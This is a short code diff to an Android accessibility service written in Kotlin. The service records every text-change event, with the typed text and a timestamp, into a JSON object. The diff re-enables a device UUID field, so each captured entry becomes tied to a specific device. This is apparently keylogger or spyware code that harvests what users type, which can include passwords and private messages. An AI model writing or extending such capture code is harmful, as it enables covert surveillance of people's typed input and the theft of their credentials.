@@ -21,10 +21,10 @@ class MyAccessibilityService : AccessibilityService() {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                 val text = event.text.toString()
                 val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
-//                val uuid = SystemDetails.getUUID(this)
+                val uuid = SystemDetails.getUUID(this)
                 Log.d("AccessibilityService", "Text changed: $text")
                 val details = JSONObject().apply {
-//                    put("UUID", uuid)
+                    put("UUID", uuid)
                     put("EventType", "Text Changed")
                     put("Details", text)
                     put("Timestamp", timestamp)
